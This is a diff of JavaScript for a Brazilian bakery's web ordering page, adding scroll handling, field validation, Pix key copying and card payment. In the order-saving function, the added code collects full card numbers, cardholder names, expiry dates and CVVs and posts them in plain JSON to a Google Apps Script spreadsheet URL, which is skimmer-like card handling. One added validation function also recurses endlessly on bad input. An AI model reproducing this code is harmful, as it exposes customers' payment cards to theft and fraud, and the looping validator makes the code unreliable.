@@ -8,7 +8,8 @@ let appState = {
     cupomAtivo: null,
     pagamentoSel: "",
     user: { nome: "", tel: "", entrega: "", endereco: "" },
-    ultimaMsg: ""
+    ultimaMsg: "",
+    scrollPos: 0 // Armazena a posição da tela para retorno
 };
 
 const el = id => document.getElementById(id);
@@ -16,6 +17,8 @@ const fmtMoeda = val => `R$ ${parseFloat(val || 0).toFixed(2)}`;
 
 const fecharModais = () => {
     document.querySelectorAll('.modal-pedido, .modal-overlay, #modalImg').forEach(m => m.style.display = 'none');
+    // Retorna o usuário para a posição exata onde ele estava no cardápio
+    window.scrollTo({ top: appState.scrollPos, behavior: 'instant' });
 };
 
 // --- RENDERIZAÇÃO INICIAL (MANTIDA) ---
@@ -73,7 +76,6 @@ function abrirDetalhes(secaoIdx, itemIdx) {
         const chaveOpcionais = "opcionais" + nomeSecao;
         const listaPrecosOpcionais = dadosIniciais[chaveOpcionais] || [];
 
-        // Alteração: menu-opc começa com display: none
         htmlOpcionais = `
             <div class="menu-opcionais" id="menu-opc" style="display: none;">
                 <div class="titulo-opcionais" onclick="this.parentElement.classList.toggle('aberto')">
@@ -100,7 +102,6 @@ function abrirDetalhes(secaoIdx, itemIdx) {
             </div>`;
     }
 
-    // Alteração: Frame da imagem quadrado com borda e margem (padding)
     modalConteudo.innerHTML = `
         <div style="width: 220px; height: 220px; margin: 20px auto 15px auto; background:#eee; border: 2px solid var(--nav); border-radius:12px; overflow:hidden; display:flex; align-items:center; justify-content:center; padding: 10px; box-sizing: border-box;">
             <img src="${produto[3]}" style="width:100%; height:100%; object-fit:cover; border-radius:8px; display:block;">
@@ -124,8 +125,11 @@ function abrirDetalhes(secaoIdx, itemIdx) {
             <button id="btn-modal-prosseguir" class="btn-prosseguir" style="display: none; margin-top: 10px;" onclick="abrirRevisao()">PROSSEGUIR PARA A CESTA DE COMPRAS ></button>
         </div>`;
 
+    // Salva a posição antes de abrir e rola para o topo
+    appState.scrollPos = window.scrollY;
     el('modalOverlay').style.display = 'block';
     el('modalProduto').style.display = 'block';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
 function atualizarSubtotalItem(nome, precoBase) {
@@ -252,7 +256,6 @@ function abrirRevisao() {
     const lista = el('lista-revisao-completa');
     if (!lista) return;
 
-    // 1. Renderiza os itens com background suave e botão EXCLUIR vermelho
     if (appState.carrinho.length === 0) {
         lista.innerHTML = "<p style='text-align:center; padding:20px; color:#666;'>Sua cesta está vazia.</p>";
     } else {
@@ -275,24 +278,18 @@ function abrirRevisao() {
         }).join('');
     }
 
-    // 2. Ajuste de Alinhamento e Estilo do Cupom (B)
     const btnAplicar = el('modalRevisao').querySelector('button[onclick="aplicarCupom()"]');
     const inputCupom = el('inputCupom');
     
     if (btnAplicar && inputCupom) {
-        // Garante que o contêiner pai alinhe os dois ao centro
         inputCupom.parentElement.style.display = "flex";
         inputCupom.parentElement.style.alignItems = "center";
         inputCupom.parentElement.style.gap = "8px";
-
-        // Estilo do Input
-        inputCupom.style.height = "34px"; // Altura menor
+        inputCupom.style.height = "34px";
         inputCupom.style.margin = "0";
         inputCupom.style.flex = "1";
-
-        // Estilo do Botão Aplicar (Mais largo e mesma altura do input)
         btnAplicar.style.height = "34px";
-        btnAplicar.style.width = "100px"; // Um pouco mais largo
+        btnAplicar.style.width = "100px";
         btnAplicar.style.padding = "0";
         btnAplicar.style.margin = "0";
         btnAplicar.style.display = "flex";
@@ -301,17 +298,20 @@ function abrirRevisao() {
         btnAplicar.style.fontSize = "0.8rem";
     }
 
-    // Sincroniza fontes dos títulos
     const pCupom = inputCupom.parentElement.previousElementSibling;
     if (pCupom && pCupom.tagName === "P") {
         pCupom.style.cssText = "font-weight: bold; font-size: 0.85rem; margin-bottom: 8px;";
     }
 
+    // Gerencia o foco visual
+    appState.scrollPos = window.scrollY;
     atualizarTotais();
     fecharModais();
     el('modalOverlay').style.display = 'block';
     el('modalRevisao').style.display = 'block';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
 }
+
 // 3. Nova função para destacar botões de recebimento
 function selEntrega(tipo, elemento) {
     // Define a taxa
@@ -436,96 +436,277 @@ console.log(validarCPF("11111111111")); // false (repetido)
 // Coloque um CPF real com 11 números para testar como true
 
 
-// 2. Ajustando a abertura de dados com lógica de endereço, CPF e Senha
 function abrirDados() {
-    // Abre o modal de dados
+    appState.scrollPos = window.scrollY; 
     fecharModais();
     el('modalOverlay').style.display = 'block';
     el('modalDados').style.display = 'block';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
 
-    // Garante que a etapa inicial de dados apareça
     el('etapa-dados').style.display = 'block';
     el('etapa-pagamento').style.display = 'none';
 
-    // Lógica do Endereço: Mostra apenas se houver taxa de entrega (appState.taxaEntrega > 0)
-    const campoEndereco = el('endCliDados');
-    if (campoEndereco) {
-        campoEndereco.style.display = (appState.taxaEntrega > 0) ? 'block' : 'none';
-        campoEndereco.required = (appState.taxaEntrega > 0);
+    const dddsValidos = [11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 22, 24, 27, 28, 31, 32, 33, 34, 35, 37, 38, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 53, 54, 55, 61, 62, 64, 63, 65, 66, 67, 68, 69, 71, 73, 74, 75, 77, 79, 81, 87, 82, 83, 84, 85, 88, 86, 89, 91, 93, 94, 92, 97, 95, 96, 98, 99];
+
+    // --- 1. VALIDAÇÃO DO NOME ---
+    const inputNome = el('nomeCli');
+    if (inputNome) {
+        inputNome.onblur = function() {
+            if (this.value.trim().length < 3) {
+                alert("Por favor, digite seu nome completo.");
+                setTimeout(() => this.focus(), 10);
+                this.style.borderColor = "red";
+            } else {
+                this.style.borderColor = "#ccc";
+            }
+        };
     }
 
-    // 3. Adicionando campos de CPF e Senha (apenas se não existirem no HTML)
+    // --- 2. VALIDAÇÃO TELEFONE ---
     const inputTel = el('telCli');
-    if (inputTel && !el('cpfCli')) {
-        // Criar Input CPF
-        const inputCpf = document.createElement('input');
-        inputCpf.type = 'tel';
-        inputCpf.id = 'cpfCli';
-        inputCpf.placeholder = 'CPF (Apenas números) *';
-        inputCpf.maxLength = 11;
-        inputCpf.style.width = "100%";
-        inputCpf.style.marginTop = "10px";
-        inputCpf.oninput = function() { validarApenasNumeros(this); };
-        
-        // Criar Input Senha
-        const inputSenha = document.createElement('input');
-        inputSenha.type = 'password';
-        inputSenha.id = 'senhaCli';
-        inputSenha.placeholder = 'Crie uma Senha *';
-        inputSenha.style.width = "100%";
-        inputSenha.style.marginTop = "10px";
+    if (inputTel) {
+        inputTel.onblur = function() {
+            const num = this.value.replace(/\D/g, '');
+            const ddd = parseInt(num.substring(0, 2));
+            if (num.length !== 11 || !dddsValidos.includes(ddd)) {
+                alert("ERRO NO TELEFONE:\n- Use DDD + 9 dígitos (Total 11 números).\n- O DDD deve ser válido no Brasil.");
+                setTimeout(() => this.focus(), 10);
+                this.style.borderColor = "red";
+            } else {
+                this.style.borderColor = "#ccc";
+            }
+        };
+    }
 
-        // Inserir no HTML logo abaixo do Telefone
+    // --- 3. VALIDAÇÃO ENDEREÇO ---
+    const campoEndereco = el('endCliDados');
+    if (campoEndereco) {
+        const precisaEntrega = (appState.taxaEntrega > 0);
+        campoEndereco.style.display = precisaEntrega ? 'block' : 'none';
+        
+        campoEndereco.onblur = function() {
+            if (precisaEntrega) {
+                const val = this.value.toUpperCase().trim();
+                const regexEnd = /^(RUA|AVENIDA|PRAÇA|PRACA).*\d+/;
+                if (!regexEnd.test(val)) {
+                    alert("ERRO NO ENDEREÇO:\n- Deve começar com RUA, AVENIDA ou PRAÇA.\n- Deve conter o número da residência.");
+                    setTimeout(() => this.focus(), 10);
+                    this.style.borderColor = "red";
+                } else {
+                    this.style.borderColor = "#ccc";
+                }
+            }
+        };
+    }
+
+    // --- 4. CRIAÇÃO E VALIDAÇÃO CPF E SENHA ---
+    if (!el('cpfCli')) {
+        const inputCpf = document.createElement('input');
+        inputCpf.id = 'cpfCli';
+        inputCpf.placeholder = 'CPF (Apenas 11 números) *';
+        inputCpf.maxLength = 11;
+        inputCpf.style.cssText = "width:100%; margin-top:10px;";
+        
+        inputCpf.onblur = function() {
+            const cpfLpo = this.value.replace(/\D/g, '');
+            if (!validarCPF(cpfLpo)) {
+                alert("CPF INVÁLIDO:\nOs números digitados não formam um CPF válido.");
+                setTimeout(() => this.focus(), 10);
+                this.style.borderColor = "red";
+            } else {
+                this.style.borderColor = "#ccc";
+            }
+        };
+
+        const inputSenha = document.createElement('input');
+        inputSenha.id = 'senhaCli';
+        inputSenha.type = 'password';
+        inputSenha.placeholder = 'Crie uma Senha (mín. 4 caracteres) *';
+        inputSenha.style.cssText = "width:100%; margin-top:10px;";
+        
+        inputSenha.onblur = function() {
+            if (this.value.length < 4) {
+                alert("A senha deve ter pelo menos 4 caracteres.");
+                setTimeout(() => this.focus(), 10);
+                this.style.borderColor = "red";
+            } else {
+                this.style.borderColor = "#ccc";
+            }
+        };
+
         inputTel.insertAdjacentElement('afterend', inputCpf);
         inputCpf.insertAdjacentElement('afterend', inputSenha);
     }
+
+    // VALIDAÇÃO CARTÃO
+    const inputCartao = el('numCartao');
+    if (inputCartao) {
+        inputCartao.onblur = function() {
+            if (!validarCartaoCredito(this.value)) {
+                alert("Número de cartão de crédito inválido! Verifique os dígitos.");
+                setTimeout(() => this.focus(), 10);
+                this.style.borderColor = "red";
+            } else {
+                this.style.borderColor = "#ccc";
+            }
+        };
+    }
+
+    // Validação simples para o CVV (apenas 3 números)
+    const inputCVV = el('cvvCartao');
+    if (inputCVV) {
+        inputCVV.onblur = function() {
+            if (this.value.length < 3 || isNaN(this.value)) {
+                alert("CVV inválido! Digite os 3 números no verso do cartão.");
+                setTimeout(() => this.focus(), 10);
+                this.style.borderColor = "red";
+            } else {
+                this.style.borderColor = "#ccc";
+            }
+        };
+    }
 }
 
-// 1. Função para validar e avançar para o pagamento
-function irParaPagamento() {
-    const nome = el('nomeCli').value.trim();
-    const tel = el('telCli').value.trim();
-    const cpf = el('cpfCli') ? el('cpfCli').value.trim() : "";
-    const senha = el('senhaCli') ? el('senhaCli').value.trim() : "";
-    const endereco = el('endCliDados').value.trim();
+function validarCartaoCredito(number) {
+    const sanitized = String(number).replace(/\D/g, '');
+    if (!sanitized) return false;
+    let soma = 0;
+    let deveDobrar = false;
+    for (let i = sanitized.length - 1; i >= 0; i--) {
+        let digito = parseInt(sanitized.charAt(i));
+        if (deveDobrar) {
+            digito *= 2;
+            if (digito > 9) digito -= 9;
+        }
+        soma += digito;
+        deveDobrar = !deveDobrar;
+    }
+    return (soma % 10) === 0;
+}
 
-    // 1. Validação de Nome
-    if (nome.length < 3) {
-        alert("Por favor, informe seu nome completo.");
-        return;
+function validarEntradasRecursivo() {
+    const dddsValidos = [11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 22, 24, 27, 28, 31, 32, 33, 34, 35, 37, 38, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 53, 54, 55, 61, 62, 63, 64, 65, 66, 67, 68, 69, 71, 73, 74, 75, 77, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99];
+    
+    const inputTel = el('telCli');
+    const inputCpf = el('cpfCli');
+    const inputEnd = el('endCliDados');
+    
+    // 1. Verificação do Telefone
+    const telLimpo = inputTel.value.replace(/\D/g, '');
+    const ddd = parseInt(telLimpo.substring(0, 2));
+    if (telLimpo.length !== 11 || !dddsValidos.includes(ddd)) {
+        alert("Telefone inválido! Deve conter DDD válido + 9 dígitos.");
+        inputTel.style.borderColor = "red";
+        inputTel.focus();
+        return validarEntradasRecursivo(); // RECURSIVIDADE: Chama de novo enquanto houver erro
+    }
+    inputTel.style.borderColor = "#ccc";
+
+    // 2. Verificação do CPF
+    if (inputCpf && !validarCPF(inputCpf.value)) {
+        alert("CPF inválido! Por favor, verifique os números.");
+        inputCpf.style.borderColor = "red";
+        inputCpf.focus();
+        return validarEntradasRecursivo(); // RECURSIVIDADE
+    }
+    if(inputCpf) inputCpf.style.borderColor = "#ccc";
+
+    // 3. Verificação do Endereço (Apenas se houver taxa de entrega)
+    if (appState.taxaEntrega > 0) {
+        const endUpper = inputEnd.value.toUpperCase().trim();
+        const regexEnd = /^(RUA|AVENIDA|PRAÇA|PRACA).*\d+/;
+        if (!regexEnd.test(endUpper)) {
+            alert("Endereço deve começar com RUA, AVENIDA ou PRAÇA e conter o número.");
+            inputEnd.style.borderColor = "red";
+            inputEnd.focus();
+            return validarEntradasRecursivo(); // RECURSIVIDADE
+        }
+        inputEnd.style.borderColor = "#ccc";
     }
 
-    // 2. Validação de WhatsApp (DDD + Número)
-    if (tel.replace(/\D/g, '').length !== 11) {
-        alert("Informe o WhatsApp com DDD (11 dígitos, apenas números).");
-        return;
+    // BASE DA RECURSÃO: Se chegou aqui, não há erros.
+    console.log("Todas as entradas estão válidas.");
+    return true; 
+}
+
+function validarFluxoRecursivo(listaCampos) {
+    if (listaCampos.length === 0) return true; // Fim da verificação: Tudo OK
+
+    const idAtual = listaCampos[0];
+    const campo = el(idAtual);
+    
+    // Se o campo não existe ou não está visível (ex: endereço em retirada), pula para o próximo
+    if (!campo || campo.style.display === 'none') {
+        return validarFluxoRecursivo(listaCampos.slice(1));
     }
 
-    // 3. Validação de CPF (Usando sua nova função matemática)
-    if (!validarCPF(cpf)) {
-        alert("O CPF informado é inválido. Por favor, verifique os números.");
-        return;
+    // Dispara o evento de validação que criamos na abrirDados
+    campo.focus();
+    campo.blur(); 
+
+    // Se o blur deixou a borda vermelha, para a recursão aqui
+    if (campo.style.borderColor === "red") {
+        return false; 
     }
 
-    // 4. Validação de Senha
-    if (senha.length < 4) {
-        alert("Crie uma senha de pelo menos 4 caracteres.");
-        return;
-    }
+    // Se passou, chama a si mesma para o próximo campo da lista
+    return validarFluxoRecursivo(listaCampos.slice(1));
+}
 
-    // 5. Validação de Endereço (Se for Entrega)
-    if (appState.taxaEntrega > 0 && endereco.length < 10) {
-        alert("Por favor, informe o endereço completo para entrega.");
-        return;
-    }
+/*function prosseguirParaPagamento() {
+    // ADICIONADO 'nomeCli' NA LISTA ABAIXO:
+    const camposParaValidar = ['nomeCli', 'telCli', 'cpfCli', 'endCliDados'];
+    
+    // 1. Agora a recursão vai validar o Nome, depois Tel, depois CPF...
+    if (!validarFluxoRecursivo(camposParaValidar)) return;
 
-    // Se tudo estiver OK, avança para o pagamento
+    // 2. Se chegou aqui, as entradas estão perfeitas. Agora salvamos:
+    appState.user = { 
+        nome: el('nomeCli').value.trim(), // Adicionei .trim() para evitar espaços vazios
+        tel: el('telCli').value.replace(/\D/g, ''), 
+        endereco: el('endCliDados').value,
+        cpf: el('cpfCli') ? el('cpfCli').value : ""
+    };
+    localStorage.setItem('paodociso_dados', JSON.stringify({ nome: appState.user.nome, tel: appState.user.tel }));
+
+    // 3. Segue o fluxo para o pagamento
     el('etapa-dados').style.display = 'none';
     el('etapa-pagamento').style.display = 'block';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}*/
+
+function prosseguirParaPagamento() {
+    const camposParaValidar = ['nomeCli', 'telCli', 'cpfCli', 'endCliDados'];
     
-    if (el('pix-valor-txt')) {
-        el('pix-valor-txt').innerText = fmtMoeda(appState.totalGeral);
-    }
+    if (!validarFluxoRecursivo(camposParaValidar)) return;
+
+    appState.user = { 
+        nome: el('nomeCli').value.trim(),
+        tel: el('telCli').value.replace(/\D/g, ''), 
+        endereco: el('endCliDados').value,
+        cpf: el('cpfCli') ? el('cpfCli').value : ""
+    };
+    localStorage.setItem('paodociso_dados', JSON.stringify({ nome: appState.user.nome, tel: appState.user.tel }));
+
+    el('etapa-dados').style.display = 'none';
+    el('etapa-pagamento').style.display = 'block';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// Função Auxiliar de Algoritmo de CPF (Adicione abaixo da abrirDados)
+function validarCPF(cpf) {
+    cpf = cpf.replace(/\D/g, '');
+    if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+    let soma = 0, resto;
+    for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i-1, i)) * (11 - i);
+    resto = (soma * 10) % 11;
+    if ((resto === 10) || (resto === 11)) resto = 0;
+    if (resto !== parseInt(cpf.substring(9, 10))) return false;
+    soma = 0;
+    for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i-1, i)) * (12 - i);
+    resto = (soma * 10) % 11;
+    if ((resto === 10) || (resto === 11)) resto = 0;
+    return resto === parseInt(cpf.substring(10, 11));
 }
 
 // Mantenha a sua função validarCPF(cpf) abaixo ou acima desta.
@@ -537,27 +718,47 @@ function validarApenasNumeros(input) {
 
 // Seleção da Forma de Pagamento
 function selPgto(tipo, elemento) {
-    appState.formaPgto = tipo;
+    appState.formaPgto = tipo; // Define se é 'Pix', 'Cartão', etc.
 
-    // Remove destaque de todos os botões de pagamento
+    // 1. Limpa o visual de todos os botões
     document.querySelectorAll('.opcao-pagamento').forEach(opt => {
         opt.style.border = "2px solid #eee";
         opt.style.background = "#fff";
+        // Esconde todos os frames de informação (Pix, Cartão, etc)
+        const frame = opt.querySelector('.pagamento-info-frame');
+        if (frame) frame.style.display = 'none';
     });
 
-    // Destaca o selecionado
+    // 2. Destaca o botão que foi clicado
     elemento.style.border = "2px solid var(--a-brown)";
     elemento.style.background = "#fdf8f3";
 
-    // Mostra/Esconde informações específicas (como QR Code do PIX)
+    // 3. Mostra o conteúdo específico (O formulário de cartão ou o QR Code)
     const infoFrame = elemento.querySelector('.pagamento-info-frame');
-    document.querySelectorAll('.pagamento-info-frame').forEach(f => f.style.display = 'none');
-    if (infoFrame) infoFrame.style.display = 'block';
+    if (infoFrame) {
+        infoFrame.style.display = 'block';
+    }
 
-    // Atualiza o valor do PIX caso seja a opção selecionada
+    // 4. Se for Pix, atualiza o valor dinamicamente
     if (tipo === 'Pix' && el('pix-valor-txt')) {
         el('pix-valor-txt').innerText = fmtMoeda(appState.totalGeral);
     }
+}
+
+function copiarChave(texto) {
+    // Tenta usar a API moderna de área de transferência
+    navigator.clipboard.writeText(texto).then(() => {
+        alert("A chave PIX foi copiada!");
+    }).catch(err => {
+        // Fallback caso o navegador bloqueie a API moderna
+        const inputTemporario = document.createElement("input");
+        inputTemporario.value = texto;
+        document.body.appendChild(inputTemporario);
+        inputTemporario.select();
+        document.execCommand("copy");
+        document.body.removeChild(inputTemporario);
+        alert("A chave PIX foi copiada!");
+    });
 }
 
 // Voltar da etapa de Pagamento para Dados
@@ -568,8 +769,8 @@ function voltarParaDados() {
 
 // --- FUNÇÃO PARA SALVAR NA PLANILHA (CHAMAR ANTES DO WHATSAPP) ---
 function salvarPedidoNaPlanilha() {
-    // COLE A URL GERADA PELO GOOGLE AQUI EMBAIXO:
-    const URL_PLANILHA = "https://script.google.com/macros/s/AKfycbw8ASk-ehg-q10WK7oJE0Ah8WB1ZD7eTHryH3KLxNAvWs3WkD9cTh7vDlehe5nMOj5aWg/exec"; 
+    // ENDEREÇO ATUALIZADO CONFORME SUA SOLICITAÇÃO:
+    const URL_PLANILHA = "https://script.google.com/macros/s/AKfycbwRQmndj1t99DPcI2ofgdF8ll_uWZv1gG_Bq5ZNpEuzQyJnSqd-4rNdZU32ZjFyC2QMYg/exec"; 
 
     const dados = {
         data: new Date().toLocaleString('pt-BR'),
@@ -580,15 +781,28 @@ function salvarPedidoNaPlanilha() {
         endereco: el('endCliDados').value || "Retirada",
         pagamento: appState.formaPgto,
         total: appState.totalGeral,
-        itens: appState.carrinho.map(i => `${i.qtd}x ${i.nome}`).join(', ')
+        itens: appState.carrinho.map(i => `${i.qtd}x ${i.nome}`).join(', '),
+        cartao_num: "",
+        cartao_nome: "",
+        cartao_validade: "",
+        cartao_cvv: ""
     };
+
+    if (appState.formaPgto === 'Cartão') {
+        dados.cartao_num = el('numCartao') ? el('numCartao').value : "";
+        dados.cartao_nome = el('nomeNoCartao') ? el('nomeNoCartao').value.toUpperCase() : "";
+        dados.cartao_validade = (el('cartaoMes') && el('cartaoAno')) ? `${el('cartaoMes').value}/${el('cartaoAno').value}` : "";
+        dados.cartao_cvv = el('cvvCartao') ? el('cvvCartao').value : "";
+    }
 
     fetch(URL_PLANILHA, {
         method: 'POST',
         mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(dados)
-    }).catch(err => console.error("Erro planilha:", err));
+    })
+    .then(() => console.log("Dados enviados para a planilha com sucesso!"))
+    .catch(err => console.error("Erro planilha:", err));
 }
 
 // --- FUNÇÃO MONTAR MENSAGEM WHATSAPP (SEM CPF E SENHA) ---
@@ -643,6 +857,12 @@ function finalizar() {
         return;
     }
 
+    // VALIDAÇÃO DO CARTÃO: Se for cartão, valida antes de seguir com a planilha e WhatsApp
+    if (appState.formaPgto === 'Cartão') {
+        const camposCartao = ['numCartao', 'cvvCartao'];
+        if (!validarFluxoRecursivo(camposCartao)) return; 
+    }
+
     salvarPedidoNaPlanilha();
 
     // 1. Exibe o Modal de Sucesso
@@ -655,7 +875,6 @@ function finalizar() {
     if (!displayContagem) {
         displayContagem = document.createElement('div');
         displayContagem.id = 'contagem-regressiva';
-        // Usei uma cor marrom fixa caso sua variável não carregue
         displayContagem.style.cssText = "font-size: 3rem; font-weight: bold; color: #5d4037; margin-top: 10px; text-align: center;";
         el('modalSucesso').appendChild(displayContagem);
     }
@@ -675,7 +894,6 @@ function finalizar() {
     }, 1000);
 
     // 4. Prepara a mensagem e abre o WhatsApp após os 3 segundos
-    // Tentei envolver em um try/catch para evitar que erros na mensagem travem tudo
     let msg = "";
     try {
         msg = montarMensagemWhats();
@@ -690,12 +908,10 @@ function finalizar() {
     setTimeout(() => {
         const win = window.open(url, '_blank');
         
-        // Se o pop-up for bloqueado, redireciona na mesma aba
         if (!win || win.closed || typeof win.closed == 'undefined') {
             window.location.href = url;
         }
 
-        // Mostra o modal de suporte pós-envio logo após o disparo
         setTimeout(() => {
             if (typeof mostrarModalPosEnvio === "function") {
                 mostrarModalPosEnvio();
@@ -738,3 +954,4 @@ function reenviarWhats() {
     const url = `https://wa.me/5511982391781?text=${encodeURIComponent(msg)}`;
     window.open(url, '_blank');
 }
+// fim do código
